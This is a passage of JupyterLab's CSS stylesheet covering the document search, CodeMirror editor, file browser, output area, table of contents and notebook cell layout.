  border: var(--jp-border-width) solid var(--jp-cell-editor-active-border-color);
}

.jp-DocumentSearch-replace-button {
  display: inline-block;
  text-align: center;
  cursor: pointer;
  box-sizing: border-box;
  color: var(--jp-ui-font-color1);

  /* height - 2 * (padding of wrapper) */
  line-height: calc(var(--jp-private-document-search-button-height) - 2px);
  width: 100%;
  height: 100%;
}

.jp-DocumentSearch-replace-button:focus {
  outline: none;
}

.jp-DocumentSearch-replace-wrapper-class {
  margin-left: 14px;
  display: flex;
}

.jp-DocumentSearch-replace-toggle {
  border: none;
  background-color: var(--jp-toolbar-background);
  border-radius: var(--jp-border-radius);
}

.jp-DocumentSearch-replace-toggle:hover {
  background-color: var(--jp-layout-color2);
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.cm-editor {
  line-height: var(--jp-code-line-height);
  font-size: var(--jp-code-font-size);
  font-family: var(--jp-code-font-family);
  border: 0;
  border-radius: 0;
  height: auto;

  /* Changed to auto to autogrow */
}

.cm-editor pre {
  padding: 0 var(--jp-code-padding);
}

.jp-CodeMirrorEditor[data-type='inline'] .cm-dialog {
  background-color: var(--jp-layout-color0);
  color: var(--jp-content-font-color1);
}

.jp-CodeMirrorEditor {
  cursor: text;
}

/* When zoomed out 67% and 33% on a screen of 1440 width x 900 height */
@media screen and (min-width: 2138px) and (max-width: 4319px) {
  .jp-CodeMirrorEditor[data-type='inline'] .cm-cursor {
    border-left: var(--jp-code-cursor-width1) solid
      var(--jp-editor-cursor-color);
  }
}

/* When zoomed out less than 33% */
@media screen and (min-width: 4320px) {
  .jp-CodeMirrorEditor[data-type='inline'] .cm-cursor {
    border-left: var(--jp-code-cursor-width2) solid
      var(--jp-editor-cursor-color);
  }
}

.cm-editor.jp-mod-readOnly .cm-cursor {
  display: none;
}

.jp-CollaboratorCursor {
  border-left: 5px solid transparent;
  border-right: 5px solid transparent;
  border-top: none;
  border-bottom: 3px solid;
  background-clip: content-box;
  margin-left: -5px;
  margin-right: -5px;
}

.cm-searching,
.cm-searching span {
  /* `.cm-searching span`: we need to override syntax highlighting */
  background-color: var(--jp-search-unselected-match-background-color);
  color: var(--jp-search-unselected-match-color);
}

.cm-searching::selection,
.cm-searching span::selection {
  background-color: var(--jp-search-unselected-match-background-color);
  color: var(--jp-search-unselected-match-color);
}

.jp-current-match > .cm-searching,
.jp-current-match > .cm-searching span,
.cm-searching > .jp-current-match,
.cm-searching > .jp-current-match span {
  background-color: var(--jp-search-selected-match-background-color);
  color: var(--jp-search-selected-match-color);
}

.jp-current-match > .cm-searching::selection,
.cm-searching > .jp-current-match::selection,
.jp-current-match > .cm-searching span::selection {
  background-color: var(--jp-search-selected-match-background-color);
  color: var(--jp-search-selected-match-color);
}

.cm-trailingspace {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAFCAYAAAB4ka1VAAAAsElEQVQIHQGlAFr/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7+r3zKmT0/+pk9P/7+r3zAAAAAAAAAAABAAAAAAAAAAA6OPzM+/q9wAAAAAA6OPzMwAAAAAAAAAAAgAAAAAAAAAAGR8NiRQaCgAZIA0AGR8NiQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQyoYJ/SY80UAAAAASUVORK5CYII=);
  background-position: center left;
  background-repeat: repeat-x;
}

.jp-CollaboratorCursor-hover {
  position: absolute;
  z-index: 1;
  transform: translateX(-50%);
  color: white;
  border-radius: 3px;
  padding-left: 4px;
  padding-right: 4px;
  padding-top: 1px;
  padding-bottom: 1px;
  text-align: center;
  font-size: var(--jp-ui-font-size1);
  white-space: nowrap;
}

.jp-CodeMirror-ruler {
  border-left: 1px dashed var(--jp-border-color2);
}

/* Styles for shared cursors (remote cursor locations and selected ranges) */
.jp-CodeMirrorEditor .cm-ySelectionCaret {
  position: relative;
  border-left: 1px solid black;
  margin-left: -1px;
  margin-right: -1px;
  box-sizing: border-box;
}

.jp-CodeMirrorEditor .cm-ySelectionCaret > .cm-ySelectionInfo {
  white-space: nowrap;
  position: absolute;
  top: -1.15em;
  padding-bottom: 0.05em;
  left: -1px;
  font-size: 0.95em;
  font-family: var(--jp-ui-font-family);
  font-weight: bold;
  line-height: normal;
  user-select: none;
  color: white;
  padding-left: 2px;
  padding-right: 2px;
  z-index: 101;
  transition: opacity 0.3s ease-in-out;
}

.jp-CodeMirrorEditor .cm-ySelectionInfo {
  transition-delay: 0.7s;
  opacity: 0;
}

.jp-CodeMirrorEditor .cm-ySelectionCaret:hover > .cm-ySelectionInfo {
  opacity: 1;
  transition-delay: 0s;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.jp-MimeDocument {
  outline: none;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Variables
|----------------------------------------------------------------------------*/

:root {
  --jp-private-filebrowser-button-height: 28px;
  --jp-private-filebrowser-button-width: 48px;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.jp-FileBrowser .jp-SidePanel-content {
  display: flex;
  flex-direction: column;
}

.jp-FileBrowser-toolbar.jp-Toolbar {
  flex-wrap: wrap;
  row-gap: 12px;
  border-bottom: none;
  height: auto;
  margin: 8px 12px 0;
  box-shadow: none;
  padding: 0;
  justify-content: flex-start;
}

.jp-FileBrowser-Panel {
  flex: 1 1 auto;
  display: flex;
  flex-direction: column;
}

.jp-BreadCrumbs {
  flex: 0 0 auto;
  margin: 8px 12px;
}

.jp-BreadCrumbs-item {
  margin: 0 2px;
  padding: 0 2px;
  border-radius: var(--jp-border-radius);
  cursor: pointer;
}

.jp-BreadCrumbs-item:hover {
  background-color: var(--jp-layout-color2);
}

.jp-BreadCrumbs-item:first-child {
  margin-left: 0;
}

.jp-BreadCrumbs-item.jp-mod-dropTarget {
  background-color: var(--jp-brand-color2);
  opacity: 0.7;
}

/*-----------------------------------------------------------------------------
| Buttons
|----------------------------------------------------------------------------*/

.jp-FileBrowser-toolbar > .jp-Toolbar-item {
  flex: 0 0 auto;
  padding-left: 0;
  padding-right: 2px;
  align-items: center;
  height: unset;
}

.jp-FileBrowser-toolbar > .jp-Toolbar-item .jp-ToolbarButtonComponent {
  width: 40px;
}

/*-----------------------------------------------------------------------------
| Other styles
|----------------------------------------------------------------------------*/

.jp-FileDialog.jp-mod-conflict input {
  color: var(--jp-error-color1);
}

.jp-FileDialog .jp-new-name-title {
  margin-top: 12px;
}

.jp-LastModified-hidden {
  display: none;
}

.jp-FileSize-hidden {
  display: none;
}

.jp-FileBrowser .lm-AccordionPanel > h3:first-child {
  display: none;
}

/*-----------------------------------------------------------------------------
| DirListing
|----------------------------------------------------------------------------*/

.jp-DirListing {
  flex: 1 1 auto;
  display: flex;
  flex-direction: column;
  outline: 0;
}

.jp-DirListing-header {
  flex: 0 0 auto;
  display: flex;
  flex-direction: row;
  align-items: center;
  overflow: hidden;
  border-top: var(--jp-border-width) solid var(--jp-border-color2);
  border-bottom: var(--jp-border-width) solid var(--jp-border-color1);
  box-shadow: var(--jp-toolbar-box-shadow);
  z-index: 2;
}

.jp-DirListing-headerItem {
  padding: 4px 12px 2px;
  font-weight: 500;
}

.jp-DirListing-headerItem:hover {
  background: var(--jp-layout-color2);
}

.jp-DirListing-headerItem.jp-id-name {
  flex: 1 0 84px;
}

.jp-DirListing-headerItem.jp-id-modified {
  flex: 0 0 112px;
  border-left: var(--jp-border-width) solid var(--jp-border-color2);
  text-align: right;
}

.jp-DirListing-headerItem.jp-id-filesize {
  flex: 0 0 75px;
  border-left: var(--jp-border-width) solid var(--jp-border-color2);
  text-align: right;
}

.jp-id-narrow {
  display: none;
  flex: 0 0 5px;
  padding: 4px;
  border-left: var(--jp-border-width) solid var(--jp-border-color2);
  text-align: right;
  color: var(--jp-border-color2);
}

.jp-DirListing-narrow .jp-id-narrow {
  display: block;
}

.jp-DirListing-narrow .jp-id-modified,
.jp-DirListing-narrow .jp-DirListing-itemModified {
  display: none;
}

.jp-DirListing-headerItem.jp-mod-selected {
  font-weight: 600;
}

/* increase specificity to override bundled default */
.jp-DirListing-content {
  flex: 1 1 auto;
  margin: 0;
  padding: 0;
  list-style-type: none;
  overflow: auto;
  background-color: var(--jp-layout-color1);
}

.jp-DirListing-content mark {
  color: var(--jp-ui-font-color0);
  background-color: transparent;
  font-weight: bold;
}

.jp-DirListing-content .jp-DirListing-item.jp-mod-selected mark {
  color: var(--jp-ui-inverse-font-color0);
}

/* Style the directory listing content when a user drops a file to upload */
.jp-DirListing.jp-mod-native-drop .jp-DirListing-content {
  outline: 5px dashed rgba(128, 128, 128, 0.5);
  outline-offset: -10px;
  cursor: copy;
}

.jp-DirListing-item {
  display: flex;
  flex-direction: row;
  align-items: center;
  padding: 4px 12px;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.jp-DirListing-checkboxWrapper {
  /* Increases hit area of checkbox. */
  padding: 4px;
}

.jp-DirListing-header
  .jp-DirListing-checkboxWrapper
  + .jp-DirListing-headerItem {
  padding-left: 4px;
}

.jp-DirListing-content .jp-DirListing-checkboxWrapper {
  position: relative;
  left: -4px;
  margin: -4px 0 -4px -8px;
}

.jp-DirListing-checkboxWrapper.jp-mod-visible {
  visibility: visible;
}

/* For devices that support hovering, hide checkboxes until hovered, selected...
*/
@media (hover: hover) {
  .jp-DirListing-checkboxWrapper {
    visibility: hidden;
  }

  .jp-DirListing-item:hover .jp-DirListing-checkboxWrapper,
  .jp-DirListing-item.jp-mod-selected .jp-DirListing-checkboxWrapper {
    visibility: visible;
  }
}

.jp-DirListing-item[data-is-dot] {
  opacity: 75%;
}

.jp-DirListing-item.jp-mod-selected {
  color: var(--jp-ui-inverse-font-color1);
  background: var(--jp-brand-color1);
}

.jp-DirListing-item.jp-mod-dropTarget {
  background: var(--jp-brand-color3);
}

.jp-DirListing-item:hover:not(.jp-mod-selected) {
  background: var(--jp-layout-color2);
}

.jp-DirListing-itemIcon {
  flex: 0 0 20px;
  margin-right: 4px;
}

.jp-DirListing-itemText {
  flex: 1 0 64px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  user-select: none;
}

.jp-DirListing-itemText:focus {
  outline-width: 2px;
  outline-color: var(--jp-inverse-layout-color1);
  outline-style: solid;
  outline-offset: 1px;
}

.jp-DirListing-item.jp-mod-selected .jp-DirListing-itemText:focus {
  outline-color: var(--jp-layout-color1);
}

.jp-DirListing-itemModified {
  flex: 0 0 125px;
  text-align: right;
}

.jp-DirListing-itemFileSize {
  flex: 0 0 90px;
  text-align: right;
}

.jp-DirListing-editor {
  flex: 1 0 64px;
  outline: none;
  border: none;
  color: var(--jp-ui-font-color1);
  background-color: var(--jp-layout-color1);
}

.jp-DirListing-item.jp-mod-running .jp-DirListing-itemIcon::before {
  color: var(--jp-success-color1);
  content: '\25CF';
  font-size: 8px;
  position: absolute;
  left: -8px;
}

.jp-DirListing-item.jp-mod-running.jp-mod-selected
  .jp-DirListing-itemIcon::before {
  color: var(--jp-ui-inverse-font-color1);
}

.jp-DirListing-item.lm-mod-drag-image,
.jp-DirListing-item.jp-mod-selected.lm-mod-drag-image {
  font-size: var(--jp-ui-font-size1);
  padding-left: 4px;
  margin-left: 4px;
  width: 160px;
  background-color: var(--jp-ui-inverse-font-color2);
  box-shadow: var(--jp-elevation-z2);
  border-radius: 0;
  color: var(--jp-ui-font-color1);
  transform: translateX(-40%) translateY(-58%);
}

.jp-Document {
  min-width: 120px;
  min-height: 120px;
  outline: none;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Main OutputArea
| OutputArea has a list of Outputs
|----------------------------------------------------------------------------*/

.jp-OutputArea {
  overflow-y: auto;
}

.jp-OutputArea-child {
  display: table;
  table-layout: fixed;
  width: 100%;
  overflow: hidden;
}

.jp-OutputPrompt {
  width: var(--jp-cell-prompt-width);
  color: var(--jp-cell-outprompt-font-color);
  font-family: var(--jp-cell-prompt-font-family);
  padding: var(--jp-code-padding);
  letter-spacing: var(--jp-cell-prompt-letter-spacing);
  line-height: var(--jp-code-line-height);
  font-size: var(--jp-code-font-size);
  border: var(--jp-border-width) solid transparent;
  opacity: var(--jp-cell-prompt-opacity);

  /* Right align prompt text, don't wrap to handle large prompt numbers */
  text-align: right;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;

  /* Disable text selection */
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.jp-OutputArea-prompt {
  display: table-cell;
  vertical-align: top;
}

.jp-OutputArea-output {
  display: table-cell;
  width: 100%;
  height: auto;
  overflow: auto;
  user-select: text;
  -moz-user-select: text;
  -webkit-user-select: text;
  -ms-user-select: text;
}

.jp-OutputArea .jp-RenderedText {
  padding-left: 1ch;
}

/**
 * Prompt overlay.
 */

.jp-OutputArea-promptOverlay {
  position: absolute;
  top: 0;
  width: var(--jp-cell-prompt-width);
  height: 100%;
  opacity: 0.5;
}

.jp-OutputArea-promptOverlay:hover {
  background: var(--jp-layout-color2);
  box-shadow: inset 0 0 1px var(--jp-inverse-layout-color0);
  cursor: zoom-out;
}

.jp-mod-outputsScrolled .jp-OutputArea-promptOverlay:hover {
  cursor: zoom-in;
}

/**
 * Isolated output.
 */
.jp-OutputArea-output.jp-mod-isolated {
  width: 100%;
  display: block;
}

/*
When drag events occur, `lm-mod-override-cursor` is added to the body.
Because iframes steal all cursor events, the following two rules are necessary
to suppress pointer events while resize drags are occurring. There may be a
better solution to this problem.
*/
body.lm-mod-override-cursor .jp-OutputArea-output.jp-mod-isolated {
  position: relative;
}

body.lm-mod-override-cursor .jp-OutputArea-output.jp-mod-isolated::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: transparent;
}

/* pre */

.jp-OutputArea-output pre {
  border: none;
  margin: 0;
  padding: 0;
  overflow-x: auto;
  overflow-y: auto;
  word-break: break-all;
  word-wrap: break-word;
  white-space: pre-wrap;
}

/* tables */

.jp-OutputArea-output.jp-RenderedHTMLCommon table {
  margin-left: 0;
  margin-right: 0;
}

/* description lists */

.jp-OutputArea-output dl,
.jp-OutputArea-output dt,
.jp-OutputArea-output dd {
  display: block;
}

.jp-OutputArea-output dl {
  width: 100%;
  overflow: hidden;
  padding: 0;
  margin: 0;
}

.jp-OutputArea-output dt {
  font-weight: bold;
  float: left;
  width: 20%;
  padding: 0;
  margin: 0;
}

.jp-OutputArea-output dd {
  float: left;
  width: 80%;
  padding: 0;
  margin: 0;
}

.jp-TrimmedOutputs pre {
  background: var(--jp-layout-color3);
  font-size: calc(var(--jp-code-font-size) * 1.4);
  text-align: center;
  text-transform: uppercase;
}

/* Hide the gutter in case of
 *  - nested output areas (e.g. in the case of output widgets)
 *  - mirrored output areas
 */
.jp-OutputArea .jp-OutputArea .jp-OutputArea-prompt {
  display: none;
}

/* Hide empty lines in the output area, for instance due to cleared widgets */
.jp-OutputArea-prompt:empty {
  padding: 0;
  border: 0;
}

/*-----------------------------------------------------------------------------
| executeResult is added to any Output-result for the display of the object
| returned by a cell
|----------------------------------------------------------------------------*/

.jp-OutputArea-output.jp-OutputArea-executeResult {
  margin-left: 0;
  width: 100%;
}

/* Text output with the Out[] prompt needs a top padding to match the
 * alignment of the Out[] prompt itself.
 */
.jp-OutputArea-executeResult .jp-RenderedText.jp-OutputArea-output {
  padding-top: var(--jp-code-padding);
  border-top: var(--jp-border-width) solid transparent;
}

/*-----------------------------------------------------------------------------
| The Stdin output
|----------------------------------------------------------------------------*/

.jp-Stdin-prompt {
  color: var(--jp-content-font-color0);
  padding-right: var(--jp-code-padding);
  vertical-align: baseline;
  flex: 0 0 auto;
}

.jp-Stdin-input {
  font-family: var(--jp-code-font-family);
  font-size: inherit;
  color: inherit;
  background-color: inherit;
  width: 42%;
  min-width: 200px;

  /* make sure input baseline aligns with prompt */
  vertical-align: baseline;

  /* padding + margin = 0.5em between prompt and cursor */
  padding: 0 0.25em;
  margin: 0 0.25em;
  flex: 0 0 70%;
}

.jp-Stdin-input::placeholder {
  opacity: 0;
}

.jp-Stdin-input:focus {
  box-shadow: none;
}

.jp-Stdin-input:focus::placeholder {
  opacity: 1;
}

/*-----------------------------------------------------------------------------
| Output Area View
|----------------------------------------------------------------------------*/

.jp-LinkedOutputView .jp-OutputArea {
  height: 100%;
  display: block;
}

.jp-LinkedOutputView .jp-OutputArea-output:only-child {
  height: 100%;
}

/*-----------------------------------------------------------------------------
| Printing
|----------------------------------------------------------------------------*/

@media print {
  .jp-OutputArea-child {
    break-inside: avoid-page;
  }
}

/*-----------------------------------------------------------------------------
| Mobile
|----------------------------------------------------------------------------*/
@media only screen and (max-width: 760px) {
  .jp-OutputPrompt {
    display: table-row;
    text-align: left;
  }

  .jp-OutputArea-child .jp-OutputArea-output {
    display: table-row;
    margin-left: var(--jp-notebook-padding);
  }
}

/* Trimmed outputs warning */
.jp-TrimmedOutputs > a {
  margin: 10px;
  text-decoration: none;
  cursor: pointer;
}

.jp-TrimmedOutputs > a:hover {
  text-decoration: none;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Table of Contents
|----------------------------------------------------------------------------*/

:root {
  --jp-private-toc-active-width: 4px;
}

.jp-TableOfContents {
  display: flex;
  flex-direction: column;
  background: var(--jp-layout-color1);
  color: var(--jp-ui-font-color1);
  font-size: var(--jp-ui-font-size1);
  height: 100%;
}

.jp-TableOfContents-placeholder {
  text-align: center;
}

.jp-TableOfContents-placeholderContent {
  color: var(--jp-content-font-color2);
  padding: 8px;
}

.jp-TableOfContents-placeholderContent > h3 {
  margin-bottom: var(--jp-content-heading-margin-bottom);
}

.jp-TableOfContents .jp-SidePanel-content {
  overflow-y: auto;
}

.jp-TableOfContents-tree {
  margin: 4px;
}

.jp-TableOfContents ol {
  list-style-type: none;
}

/* stylelint-disable-next-line selector-max-type */
.jp-TableOfContents li > ol {
  /* Align left border with triangle icon center */
  padding-left: 11px;
}

.jp-TableOfContents-content {
  /* left margin for the active heading indicator */
  margin: 0 0 0 var(--jp-private-toc-active-width);
  padding: 0;
  background-color: var(--jp-layout-color1);
}

.jp-tocItem {
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.jp-tocItem-heading {
  display: flex;
  cursor: pointer;
}

.jp-tocItem-heading:hover {
  background-color: var(--jp-layout-color2);
}

.jp-tocItem-content {
  display: block;
  padding: 4px 0;
  white-space: nowrap;
  text-overflow: ellipsis;
  overflow-x: hidden;
}

.jp-tocItem-collapser {
  height: 20px;
  margin: 2px 2px 0;
  padding: 0;
  background: none;
  border: none;
  cursor: pointer;
}

.jp-tocItem-collapser:hover {
  background-color: var(--jp-layout-color3);
}

/* Active heading indicator */

.jp-tocItem-heading::before {
  content: ' ';
  background: transparent;
  width: var(--jp-private-toc-active-width);
  height: 24px;
  position: absolute;
  left: 0;
  border-radius: var(--jp-border-radius);
}

.jp-tocItem-heading.jp-tocItem-active::before {
  background-color: var(--jp-brand-color1);
}

.jp-tocItem-heading:hover.jp-tocItem-active::before {
  background: var(--jp-brand-color0);
  opacity: 1;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.jp-Collapser {
  flex: 0 0 var(--jp-cell-collapser-width);
  padding: 0;
  margin: 0;
  border: none;
  outline: none;
  background: transparent;
  border-radius: var(--jp-border-radius);
  opacity: 1;
}

.jp-Collapser-child {
  display: block;
  width: 100%;
  box-sizing: border-box;

  /* height: 100% doesn't work because the height of its parent is computed from content */
  position: absolute;
  top: 0;
  bottom: 0;
}

/*-----------------------------------------------------------------------------
| Printing
|----------------------------------------------------------------------------*/

/*
Hiding collapsers in print mode.

Note: input and output wrappers have "display: block" propery in print mode.
*/

@media print {
  .jp-Collapser {
    display: none;
  }
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Header/Footer
|----------------------------------------------------------------------------*/

/* Hidden by zero height by default */
.jp-CellHeader,
.jp-CellFooter {
  height: 0;
  width: 100%;
  padding: 0;
  margin: 0;
  border: none;
  outline: none;
  background: transparent;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Input
|----------------------------------------------------------------------------*/

/* All input areas */
.jp-InputArea {
  display: table;
  table-layout: fixed;
  width: 100%;
  overflow: hidden;
}

.jp-InputArea-editor {
  display: table-cell;
  overflow: hidden;
  vertical-align: top;

  /* This is the non-active, default styling */
  border: var(--jp-border-width) solid var(--jp-cell-editor-border-color);
  border-radius: 0;
  background: var(--jp-cell-editor-background);
}

.jp-InputPrompt {
  display: table-cell;
  vertical-align: top;
  width: var(--jp-cell-prompt-width);
  color: var(--jp-cell-inprompt-font-color);
  font-family: var(--jp-cell-prompt-font-family);
  padding: var(--jp-code-padding);
  letter-spacing: var(--jp-cell-prompt-letter-spacing);
  opacity: var(--jp-cell-prompt-opacity);
  line-height: var(--jp-code-line-height);
  font-size: var(--jp-code-font-size);
  border: var(--jp-border-width) solid transparent;

  /* Right align prompt text, don't wrap to handle large prompt numbers */
  text-align: right;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;

  /* Disable text selection */
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

/*-----------------------------------------------------------------------------
| Mobile
|----------------------------------------------------------------------------*/
@media only screen and (max-width: 760px) {
  .jp-InputArea-editor {
    display: table-row;
    margin-left: var(--jp-notebook-padding);
  }

  .jp-InputPrompt {
    display: table-row;
    text-align: left;
  }
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Placeholder
|----------------------------------------------------------------------------*/

.jp-Placeholder {
  display: table;
  table-layout: fixed;
  width: 100%;
}

.jp-Placeholder-prompt {
  display: table-cell;
  box-sizing: border-box;
}

.jp-Placeholder-content {
  display: table-cell;
  padding: 4px 6px;
  border: 1px solid transparent;
  border-radius: 0;
  background: none;
  box-sizing: border-box;
  cursor: pointer;
}

.jp-Placeholder-contentContainer {
  display: flex;
}

.jp-Placeholder-content:hover,
.jp-InputPlaceholder > .jp-Placeholder-content:hover {
  border-color: var(--jp-layout-color3);
}

.jp-Placeholder-content .jp-MoreHorizIcon {
  width: 32px;
  height: 16px;
  border: 1px solid transparent;
  border-radius: var(--jp-border-radius);
}

.jp-Placeholder-content .jp-MoreHorizIcon:hover {
  border: 1px solid var(--jp-border-color1);
  box-shadow: 0 0 2px 0 rgba(0, 0, 0, 0.25);
  background-color: var(--jp-layout-color0);
}

.jp-PlaceholderText {
  white-space: nowrap;
  overflow-x: hidden;
  color: var(--jp-inverse-layout-color3);
  font-family: var(--jp-code-font-family);
}

.jp-InputPlaceholder > .jp-Placeholder-content {
  border-color: var(--jp-cell-editor-border-color);
  background: var(--jp-cell-editor-background);
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Private CSS variables
|----------------------------------------------------------------------------*/

:root {
  --jp-private-cell-scrolling-output-offset: 5px;
}

/*-----------------------------------------------------------------------------
| Cell
|----------------------------------------------------------------------------*/

.jp-Cell {
  padding: var(--jp-cell-padding);
  margin: 0;
  border: none;
  outline: none;
  background: transparent;
}

/*-----------------------------------------------------------------------------
| Common input/output
|----------------------------------------------------------------------------*/

.jp-Cell-inputWrapper,
.jp-Cell-outputWrapper {
  display: flex;
  flex-direction: row;
  padding: 0;
  margin: 0;

  /* Added to reveal the box-shadow on the input and output collapsers. */
  overflow: visible;
}

/* Only input/output areas inside cells */
.jp-Cell-inputArea,
.jp-Cell-outputArea {
  flex: 1 1 auto;
}

/*-----------------------------------------------------------------------------
| Collapser
|----------------------------------------------------------------------------*/

/* Make the output collapser disappear when there is not output, but do so
 * in a manner that leaves it in the layout and preserves its width.
 */
.jp-Cell.jp-mod-noOutputs .jp-Cell-outputCollapser {
  border: none !important;
  background: transparent !important;
}

.jp-Cell:not(.jp-mod-noOutputs) .jp-Cell-outputCollapser {
  min-height: var(--jp-cell-collapser-min-height);
}

/*-----------------------------------------------------------------------------
| Output
|----------------------------------------------------------------------------*/

/* Put a space between input and output when there IS output */
.jp-Cell:not(.jp-mod-noOutputs) .jp-Cell-outputWrapper {
  margin-top: 5px;
}

.jp-CodeCell.jp-mod-outputsScrolled .jp-Cell-outputArea {
  overflow-y: auto;
  max-height: 24em;
  margin-left: var(--jp-private-cell-scrolling-output-offset);
  resize: vertical;
}

.jp-CodeCell.jp-mod-outputsScrolled .jp-Cell-outputArea[style*='height'] {
  max-height: unset;
}

.jp-CodeCell.jp-mod-outputsScrolled .jp-Cell-outputArea::after {
  content: ' ';
  box-shadow: inset 0 0 6px 2px rgb(0 0 0 / 30%);
  width: 100%;
  height: 100%;
  position: sticky;
  bottom: 0;
  top: 0;
  margin-top: -50%;
  float: left;
  display: block;
  pointer-events: none;
}

.jp-CodeCell.jp-mod-outputsScrolled .jp-OutputArea-child {
  padding-top: 6px;
}

.jp-CodeCell.jp-mod-outputsScrolled .jp-OutputArea-prompt {
  width: calc(
    var(--jp-cell-prompt-width) - var(--jp-private-cell-scrolling-output-offset)
  );
}

.jp-CodeCell.jp-mod-outputsScrolled .jp-OutputArea-promptOverlay {
  left: calc(-1 * var(--jp-private-cell-scrolling-output-offset));
}

/*-----------------------------------------------------------------------------
| CodeCell
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| MarkdownCell
|----------------------------------------------------------------------------*/

.jp-MarkdownOutput {
  display: table-cell;
  width: 100%;
  margin-top: 0;
  margin-bottom: 0;
  padding-left: var(--jp-code-padding);
}

.jp-MarkdownOutput.jp-RenderedHTMLCommon {
  overflow: auto;
}

/* collapseHeadingButton (show always if hiddenCellsButton is _not_ shown) */
.jp-collapseHeadingButton {
  display: flex;
  min-height: var(--jp-cell-collapser-min-height);
  font-size: var(--jp-code-font-size);
  position: absolute;
  background-color: transparent;
  background-size: 25px;
  background-repeat: no-repeat;
  background-position-x: center;
  background-position-y: top;
  background-image: var(--jp-icon-caret-down);
  right: 0;
  top: 0;
  bottom: 0;
}

.jp-collapseHeadingButton.jp-mod-collapsed {
  background-image: var(--jp-icon-caret-right);
}

/*
 set the container font size to match that of content
 so that the nested collapse buttons have the right size
*/
.jp-MarkdownCell .jp-InputPrompt {
  font-size: var(--jp-content-font-size1);
}

/*
  Align collapseHeadingButton with cell top header
  The font sizes are identical to the ones in packages/rendermime/style/base.css
*/
.jp-mod-rendered .jp-collapseHeadingButton[data-heading-level='1'] {
  font-size: var(--jp-content-font-size5);
  background-position-y: calc(0.3 * var(--jp-content-font-size5));
}

.jp-mod-rendered .jp-collapseHeadingButton[data-heading-level='2'] {
  font-size: var(--jp-content-font-size4);
  background-position-y: calc(0.3 * var(--jp-content-font-size4));
}

.jp-mod-rendered .jp-collapseHeadingButton[data-heading-level='3'] {
  font-size: var(--jp-content-font-size3);
  background-position-y: calc(0.3 * var(--jp-content-font-size3));
}

.jp-mod-rendered .jp-collapseHeadingButton[data-heading-level='4'] {
  font-size: var(--jp-content-font-size2);
  background-position-y: calc(0.3 * var(--jp-content-font-size2));
}

.jp-mod-rendered .jp-collapseHeadingButton[data-heading-level='5'] {
  font-size: var(--jp-content-font-size1);
  background-position-y: top;
}

.jp-mod-rendered .jp-collapseHeadingButton[data-heading-level='6'] {
  font-size: var(--jp-content-font-size0);
  background-position-y: top;
}

/* collapseHeadingButton (show only on (hover,active) if hiddenCellsButton is shown) */
.jp-Notebook.jp-mod-showHiddenCellsButton .jp-collapseHeadingButton {
  display: none;
}

.jp-Notebook.jp-mod-showHiddenCellsButton
  :is(.jp-MarkdownCell:hover, .jp-mod-active)
  .jp-collapseHeadingButton {
  display: flex;
}

/* showHiddenCellsButton (only show if jp-mod-showHiddenCellsButton is set, which
is a consequence of the showHiddenCellsButton option in Notebook Settings)*/
.jp-Notebook.jp-mod-showHiddenCellsButton .jp-showHiddenCellsButton {
  margin-left: calc(var(--jp-cell-prompt-width) + 2 * var(--jp-code-padding));
  margin-top: var(--jp-code-padding);
  border: 1px solid var(--jp-border-color2);
  background-color: var(--jp-border-color3) !important;
  color: var(--jp-content-font-color0) !important;
  display: flex;
}

.jp-Notebook.jp-mod-showHiddenCellsButton .jp-showHiddenCellsButton:hover {
  background-color: var(--jp-border-color2) !important;
}

.jp-showHiddenCellsButton {
  display: none;
}

/*-----------------------------------------------------------------------------
| Printing
|----------------------------------------------------------------------------*/

/*
Using block instead of flex to allow the use of the break-inside CSS property for
cell outputs.
*/

@media print {
  .jp-Cell-inputWrapper,
  .jp-Cell-outputWrapper {
    display: block;
  }
}

